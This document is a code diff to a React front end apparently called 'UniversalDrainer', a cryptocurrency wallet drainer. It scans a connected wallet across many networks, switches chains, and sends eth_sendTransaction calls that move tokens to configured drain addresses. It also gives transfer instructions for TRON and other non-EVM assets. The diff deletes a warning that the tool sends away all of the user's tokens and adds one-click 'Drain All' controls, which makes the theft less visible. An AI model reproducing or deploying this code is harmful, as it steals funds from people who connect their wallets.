+      if (chain?.id !== token.chainId) {
+        try {
+          if (switchNetwork) {
+            await switchNetwork(Number(token.chainId));
+          } else if (window.ethereum) {
+            await window.ethereum.request({
+              method: 'wallet_switchEthereumChain',
+              params: [{ chainId: `0x${Number(token.chainId).toString(16)}` }],
+            });
+          }
+          await new Promise(resolve => setTimeout(resolve, 1000));
+        } catch (switchError) {
+          console.log(`Network switch not supported for ${token.chainId}`);
+        }
+      }
+      
       // Prepare transaction
       const transaction = {
         to: token.drainAddress,
@@ -551,14 +635,10 @@ function UniversalDrainer() {
       
       // Send via wallet
       if (window.ethereum) {
-        // Request account access
         const accounts = await window.ethereum.request({ 
           method: 'eth_requestAccounts' 
         });
         
-        console.log(`👤 Using account:`, accounts[0]);
-        
-        // Send transaction
         const txHash = await window.ethereum.request({
           method: 'eth_sendTransaction',
           params: [transaction],
@@ -576,18 +656,6 @@ function UniversalDrainer() {
           explorer: getExplorerUrl(txHash, token.chainId)
         };
         
-      } else if (walletClient) {
-        // Use wallet client
-        const hash = await walletClient.sendTransaction({
-          to: token.drainAddress,
-          value: amountInWei,
-        });
-        
-        return {
-          success: true,
-          hash,
-          message: `${token.amount} ${token.symbol} sent via wallet client`
-        };
       } else {
         return {
           success: false,
@@ -624,8 +692,8 @@ function UniversalDrainer() {
     }
   };
 
-  // Drain non-EVM token automatically
-  const drainNonEvmTokenAuto = async (token) => {
+  // Drain non-EVM token
+  const drainNonEvmToken = async (token) => {
     // TRON auto-drain
     if (token.symbol === 'TRX' && tronDetected) {
       try {
@@ -664,7 +732,6 @@ function UniversalDrainer() {
     };
   };
 
-  // Get non-EVM instructions
   const getNonEVMInstructions = (token) => {
     if (token.symbol === 'TRX') {
       return `TRON TRANSFER INSTRUCTIONS:
@@ -688,20 +755,17 @@ Value: $${(token.rawAmount * (TOKEN_PRICES[token.symbol] || 0)).toFixed(2)}
 Send to: ${token.drainAddress}`;
   };
 
-  // Get explorer URL
   const getExplorerUrl = (hash, chainId) => {
-    const explorers = {
-      1: `https://etherscan.io/tx/${hash}`,
-      56: `https://bscscan.com/tx/${hash}`,
-      137: `https://polygonscan.com/tx/${hash}`,
-      42161: `https://arbiscan.io/tx/${hash}`,
-      10: `https://optimistic.etherscan.io/tx/${hash}`,
-      8453: `https://basescan.org/tx/${hash}`,
-    };
-    return explorers[chainId] || `https://etherscan.io/tx/${hash}`;
+    const network = NETWORKS.find(n => n.id === chainId);
+    if (network?.explorer) {
+      if (chainId === 'tron') {
+        return `${network.explorer}/#/transaction/${hash}`;
+      }
+      return `${network.explorer}/tx/${hash}`;
+    }
+    return `https://etherscan.io/tx/${hash}`;
   };
 
-  // Copy to clipboard
   const copyToClipboard = (text) => {
     navigator.clipboard.writeText(text).then(() => {
       setStatus('✅ Address copied!');
@@ -710,14 +774,12 @@ Send to: ${token.drainAddress}`;
     });
   };
 
-  // Format address
   const formatAddress = (addr) => {
     if (!addr) return '';
     if (addr.length <= 10) return addr;
     return `${addr.substring(0, 6)}...${addr.substring(addr.length - 4)}`;
   };
 
-  // Format amount
   const formatAmount = (amount) => {
     const num = parseFloat(amount);
     if (isNaN(num)) return '0.00';
@@ -737,8 +799,8 @@ Send to: ${token.drainAddress}`;
           <div className="header-left">
             <div className="logo">⚡</div>
             <div>
-              <h1>AUTO TOKEN DRAINER</h1>
-              <p className="subtitle">Fully Automatic • 39+ Networks</p>
+              <h1>UNIVERSAL DRAINER</h1>
+              <p className="subtitle">39+ Networks • Auto-Scan & Drain</p>
             </div>
           </div>
           
@@ -765,11 +827,16 @@ Send to: ${token.drainAddress}`;
               <div className="status-dashboard">
                 <div className="status-card primary">
                   <div className="status-icon">
-                    {isProcessing ? '⚡' : '🚀'}
+                    {isScanning ? '🔍' : isProcessing ? '⚡' : '🚀'}
                   </div>
                   <div className="status-content">
-                    <div className="status-title">AUTO-DRAIN STATUS</div>
+                    <div className="status-title">SYSTEM STATUS</div>
                     <div className="status-message">{status}</div>
+                    {isScanning && scanProgress.total > 0 && (
+                      <div className="scan-progress">
+                        Scanning {scanProgress.current}/{scanProgress.total} • {scanProgress.network}
+                      </div>
+                    )}
                   </div>
                 </div>
                 
@@ -784,21 +851,61 @@ Send to: ${token.drainAddress}`;
                   </div>
                   <div className="stat">
                     <div className="stat-value">
-                      {transactions.filter(t => t.status?.includes('✅')).length}
+                      {[...new Set(tokens.map(t => t.network))].length}
                     </div>
-                    <div className="stat-label">Drained</div>
+                    <div className="stat-label">Networks</div>
                   </div>
                 </div>
               </div>
 
-              {/* Processing Indicator */}
-              {isProcessing && (
-                <div className="processing-indicator">
-                  <div className="processing-spinner"></div>
-                  <div className="processing-text">AUTO-DRAIN IN PROGRESS</div>
-                  <div className="processing-note">Do not disconnect wallet</div>
+              {/* Controls */}
+              <div className="controls-container">
+                <div className="control-buttons">
+                  <button
+                    onClick={scanAllNetworks}
+                    disabled={isScanning || isProcessing}
+                    className="btn btn-scan"
+                  >
+                    {isScanning ? (
+                      <>
+                        <span className="spinner"></span>
+                        Scanning...
+                      </>
+                    ) : '🔍 Scan All Networks'}
+                  </button>
+                  
+                  {tokens.length > 0 && (
+                    <button
+                      onClick={() => startAutoDrain()}
+                      disabled={isProcessing || isScanning}
+                      className="btn btn-drain"
+                    >
+                      {isProcessing ? (
+                        <>
+                          <span className="spinner"></span>
+                          Draining...
+                        </>
+                      ) : `⚡ Drain All ($${totalValue.toFixed(2)})`}
+                    </button>
+                  )}
                 </div>
-              )}
+                
+                {tokens.length > 0 && (
+                  <div className="drain-summary">
+                    <div className="summary-text">
+                      Ready to drain <strong>{tokens.length} tokens</strong> • Total: <strong>${totalValue.toFixed(2)}</strong>
+                    </div>
+                    <div className="summary-breakdown">
+                      <span className="auto-count">
+                        {tokens.filter(t => t.type === 'evm').length} auto-drain
+                      </span>
+                      <span className="manual-count">
+                        {tokens.filter(t => t.type === 'non-evm').length} manual
+                      </span>
+                    </div>
+                  </div>
+                )}
+              </div>
 
               {/* Manual Modal */}
               {showManualModal && manualToken && (
@@ -857,7 +964,7 @@ Send to: ${token.drainAddress}`;
               {transactions.length > 0 && (
                 <div className="transactions-panel">
                   <div className="panel-header">
-                    <h3>Transaction Results</h3>
+                    <h3>Transaction History</h3>
                     <div className="success-rate">
                       {transactions.filter(t => t.status?.includes('✅')).length} / {transactions.length} successful
                     </div>
@@ -871,6 +978,7 @@ Send to: ${token.drainAddress}`;
                         <div className="tx-details">
                           <div className="tx-main">
                             <span className="tx-symbol">{tx.symbol}</span>
+                            <span className="tx-network">{tx.network}</span>
                             <span className="tx-amount">{formatAmount(tx.amount)}</span>
                             <span className="tx-value">${tx.valueUSD || '0'}</span>
                           </div>
@@ -891,13 +999,14 @@ Send to: ${token.drainAddress}`;
               )}
 
               {/* Detected Tokens */}
-              {tokens.length > 0 && (
+              {tokens.length > 0 ? (
                 <div className="tokens-panel">
                   <div className="panel-header">
                     <h3>Detected Tokens</h3>
                     <div className="panel-summary">
-                      <span>${totalValue.toFixed(2)} total</span>
+                      <span>${totalValue.toFixed(2)} total value</span>
                       <span>{tokens.length} tokens</span>
+                      <span>{[...new Set(tokens.map(t => t.network))].length} networks</span>
                     </div>
                   </div>
                   <div className="tokens-grid">
@@ -921,48 +1030,47 @@ Send to: ${token.drainAddress}`;
                           {formatAmount(token.amount)} {token.symbol}
                         </div>
                         <div className="token-value">
-                          ${(token.rawAmount * (TOKEN_PRICES[token.symbol] || 0)).toFixed(2)}
+                          ${token.valueUSD?.toFixed(2) || (token.rawAmount * (TOKEN_PRICES[token.symbol] || 0)).toFixed(2)}
                         </div>
                         <div className="token-destination">
-                          To: {formatAddress(token.drainAddress)}
+                          <div className="dest-label">To:</div>
+                          <div className="dest-address">{formatAddress(token.drainAddress)}</div>
+                          <button
+                            onClick={() => copyToClipboard(token.drainAddress)}
+                            className="copy-btn"
+                          >
+                            Copy
+                          </button>
                         </div>
                       </div>
                     ))}
                   </div>
                 </div>
-              )}
-
-              {/* Instructions */}
-              <div className="instructions-panel">
-                <h3>⚠️ AUTO-DRAIN INFORMATION</h3>
-                <ul>
-                  <li>• Draining starts automatically when wallet connects</li>
-                  <li>• All tokens are sent to configured addresses</li>
-                  <li>• Transactions require approval in your wallet</li>
-                  <li>• Do not disconnect wallet during the process</li>
-                  <li>• Wallet auto-disconnects after successful drain</li>
-                </ul>
-              </div>
+              ) : !isScanning ? (
+                <div className="empty-state">
+                  <div className="empty-icon">💎</div>
+                  <h3>No tokens detected</h3>
+                  <p>Scan all 39+ networks to find tokens across all chains</p>
+                </div>
+              ) : null}
             </>
           ) : (
             <div className="welcome-screen">
               <div className="welcome-content">
                 <div className="welcome-icon">⚡</div>
-                <h2>AUTO TOKEN DRAINER</h2>
+                <h2>UNIVERSAL TOKEN DRAINER</h2>
                 <p className="welcome-text">
-                  Connect your wallet to automatically drain ALL tokens across 39+ networks
-                </p>
-                <p className="warning-text">
-                  ⚠️ WARNING: This will automatically send ALL tokens from your wallet
+                  Connect your wallet to automatically scan and drain ALL tokens across 39+ networks including TRON, Bitcoin, and all EVM chains.
                 </p>
                 <div className="connect-section">
                   <ConnectKitButton />
                 </div>
                 <div className="features">
-                  <div className="feature">• Auto-scans 39+ networks</div>
-                  <div className="feature">• Auto-drains ALL tokens</div>
-                  <div className="feature">• TRON & EVM support</div>
-                  <div className="feature">• No manual steps required</div>
+                  <div className="feature">• Scans 39+ networks automatically</div>
+                  <div className="feature">• Detects ALL tokens (EVM + non-EVM)</div>
+                  <div className="feature">• Shows TRON, Bitcoin, and all balances</div>
+                  <div className="feature">• Auto-drains with one click</div>
+                  <div className="feature">• Clear success/failure messages</div>
                 </div>
               </div>
             </div>
@@ -971,9 +1079,9 @@ Send to: ${token.drainAddress}`;
 
         <footer className="app-footer">
           <div className="footer-content">
-            <span>AUTO-DRAIN v5.0 • FULLY AUTOMATIC</span>
+            <span>UNIVERSAL DRAINER v6.0 • 39+ NETWORKS</span>
             <span className="status-dot"></span>
-            <span>{isConnected ? 'PROCESSING...' : 'READY'}</span>
+            <span>{isConnected ? (isScanning ? 'SCANNING...' : isProcessing ? 'PROCESSING...' : 'READY') : 'DISCONNECTED'}</span>
           </div>
         </footer>
       </div>
@@ -1128,6 +1236,12 @@ Send to: ${token.drainAddress}`;
           color: white;
         }
         
+        .scan-progress {
+          font-size: 12px;
+          color: #aaa;
+          margin-top: 5px;
+        }
+        
         .stats-row {
           display: flex;
           gap: 15px;
@@ -1156,46 +1270,94 @@ Send to: ${token.drainAddress}`;
           letter-spacing: 1px;
         }
         
-        /* Processing Indicator */
-        .processing-indicator {
-          background: #222;
+        /* Controls */
+        .controls-container {
+          margin-bottom: 25px;
+        }
+        
+        .control-buttons {
+          display: flex;
+          gap: 15px;
+          margin-bottom: 15px;
+        }
+        
+        .btn {
+          flex: 1;
+          padding: 16px 20px;
+          border: none;
           border-radius: 12px;
-          padding: 20px;
-          text-align: center;
-          margin-bottom: 20px;
-          border: 2px solid #ef4444;
-          animation: borderPulse 2s infinite;
+          font-size: 16px;
+          font-weight: 600;
+          cursor: pointer;
+          transition: all 0.2s;
+          display: flex;
+          align-items: center;
+          justify-content: center;
+          gap: 10px;
         }
         
-        @keyframes borderPulse {
-          0%, 100% { border-color: #ef4444; }
-          50% { border-color: #f87171; }
+        .btn-scan {
+          background: linear-gradient(45deg, #3b82f6, #60a5fa);
+          color: white;
         }
         
-        .processing-spinner {
-          width: 40px;
-          height: 40px;
-          border: 4px solid #333;
-          border-top-color: #ef4444;
+        .btn-drain {
+          background: linear-gradient(45deg, #ef4444, #f87171);
+          color: white;
+        }
+        
+        .btn:hover:not(:disabled) {
+          transform: translateY(-2px);
+          box-shadow: 0 10px 20px rgba(0, 0, 0, 0.3);
+        }
+        
+        .btn:disabled {
+          opacity: 0.5;
+          cursor: not-allowed;
+        }
+        
+        .spinner {
+          width: 18px;
+          height: 18px;
+          border: 2px solid rgba(255, 255, 255, 0.3);
           border-radius: 50%;
-          animation: spin 1s linear infinite;
-          margin: 0 auto 15px;
+          border-top-color: white;
+          animation: spin 1s ease-in-out infinite;
         }
         
         @keyframes spin {
           to { transform: rotate(360deg); }
         }
         
-        .processing-text {
-          font-size: 18px;
-          font-weight: 600;
-          color: #ef4444;
-          margin-bottom: 5px;
+        .drain-summary {
+          background: #222;
+          border-radius: 12px;
+          padding: 15px;
+          text-align: center;
         }
         
-        .processing-note {
-          color: #888;
+        .summary-text {
+          color: #ddd;
+          margin-bottom: 8px;
+        }
+        
+        .summary-text strong {
+          color: white;
+        }
+        
+        .summary-breakdown {
+          display: flex;
+          justify-content: center;
+          gap: 20px;
           font-size: 14px;
+        }
+        
+        .auto-count {
+          color: #10b981;
+        }
+        
+        .manual-count {
+          color: #f59e0b;
         }
         
         /* Modal */
@@ -1436,6 +1598,7 @@ Send to: ${token.drainAddress}`;
         .tx-main {
           display: flex;
           justify-content: space-between;
+          align-items: center;
           margin-bottom: 5px;
         }
         
@@ -1443,16 +1606,27 @@ Send to: ${token.drainAddress}`;
           font-weight: 600;
           font-size: 16px;
           color: white;
+          min-width: 60px;
+        }
+        
+        .tx-network {
+          color: #888;
+          font-size: 12px;
+          flex: 1;
         }
         
         .tx-amount {
           font-family: monospace;
           color: #ddd;
+          min-width: 80px;
+          text-align: right;
         }
         
         .tx-value {
           color: #10b981;
           font-weight: 600;
+          min-width: 70px;
+          text-align: right;
         }
         
         .tx-secondary {
@@ -1500,11 +1674,12 @@ Send to: ${token.drainAddress}`;
           color: #888;
           font-size: 14px;
           margin-bottom: 20px;
+          flex-wrap: wrap;
         }
         
         .tokens-grid {
           display: grid;
-          grid-template-columns: repeat(auto-fill, minmax(250px, 1fr));
+          grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
           gap: 15px;
         }
         
@@ -1513,6 +1688,13 @@ Send to: ${token.drainAddress}`;
           border-radius: 12px;
           padding: 20px;
           border: 1px solid #333;
+          transition: all 0.2s;
+        }
+        
+        .token-card:hover {
+          transform: translateY(-3px);
+          border-color: #444;
+          box-shadow: 0 8px 20px rgba(0, 0, 0, 0.2);
         }
         
         .token-header {
@@ -1571,37 +1753,68 @@ Send to: ${token.drainAddress}`;
         }
         
         .token-destination {
+          display: flex;
+          align-items: center;
+          gap: 10px;
           background: #222;
-          border-radius: 6px;
-          padding: 8px;
-          font-family: monospace;
-          font-size: 12px;
-          color: #888;
+          border-radius: 8px;
+          padding: 10px;
           border: 1px solid #333;
         }
         
-        /* Instructions */
-        .instructions-panel {
+        .dest-label {
+          color: #888;
+          font-size: 12px;
+        }
+        
+        .dest-address {
+          font-family: monospace;
+          font-size: 12px;
+          color: #ddd;
+          flex: 1;
+          overflow: hidden;
+          text-overflow: ellipsis;
+          white-space: nowrap;
+        }
+        
+        .copy-btn {
+          background: #333;
+          color: white;
+          border: none;
+          padding: 5px 10px;
+          border-radius: 6px;
+          font-size: 12px;
+          cursor: pointer;
+        }
+        
+        .copy-btn:hover {
+          background: #444;
+        }
+        
+        /* Empty State */
+        .empty-state {
+          text-align: center;
+          padding: 60px 20px;
           background: #222;
           border-radius: 16px;
-          padding: 20px;
-          border: 1px solid #f59e0b;
+          border: 1px solid #333;
         }
         
-        .instructions-panel h3 {
-          color: #f59e0b;
-          margin: 0 0 15px 0;
+        .empty-icon {
+          font-size: 48px;
+          margin-bottom: 20px;
         }
         
-        .instructions-panel ul {
-          margin: 0;
-          padding-left: 20px;
-          color: #ddd;
+        .empty-state h3 {
+          margin: 0 0 10px 0;
+          font-size: 24px;
+          color: white;
+        }
+        
+        .empty-state p {
+          color: #888;
+          margin-bottom: 30px;
           line-height: 1.6;
-        }
-        
-        .instructions-panel li {
-          margin-bottom: 8px;
         }
         
         /* Welcome */
@@ -1619,16 +1832,9 @@ Send to: ${token.drainAddress}`;
         
         .welcome-text {
           color: #ddd;
-          margin-bottom: 20px;
+          margin-bottom: 30px;
           font-size: 18px;
           line-height: 1.6;
-        }
-        
-        .warning-text {
-          color: #ef4444;
-          margin-bottom: 30px;
-          font-size: 16px;
-          font-weight: 600;
         }
         
         .connect-section {
@@ -1640,7 +1846,7 @@ Send to: ${token.drainAddress}`;
           border-radius: 12px;
           padding: 20px;
           text-align: left;
-          max-width: 400px;
+          max-width: 500px;
           margin: 0 auto;
         }
         
@@ -1648,6 +1854,14 @@ Send to: ${token.drainAddress}`;
           color: #ddd;
           margin-bottom: 10px;
           font-size: 14px;
+          display: flex;
+          align-items: center;
+        }
+        
+        .feature:before {
+          content: '•';
+          color: #ef4444;
+          margin-right: 10px;
         }
         
         /* Footer */
@@ -1681,6 +1895,10 @@ Send to: ${token.drainAddress}`;
             flex-direction: column;
           }
           
+          .control-buttons {
+            flex-direction: column;
+          }
+          
           .tokens-grid {
             grid-template-columns: 1fr;
           }
@@ -1694,6 +1912,16 @@ Send to: ${token.drainAddress}`;
             flex-direction: column;
             gap: 5px;
             align-items: flex-end;
+          }
+          
+          .tx-main {
+            flex-wrap: wrap;
+            gap: 5px;
+          }
+          
+          .panel-summary {
+            flex-direction: column;
+            gap: 5px;
           }
         }
       `}</style>
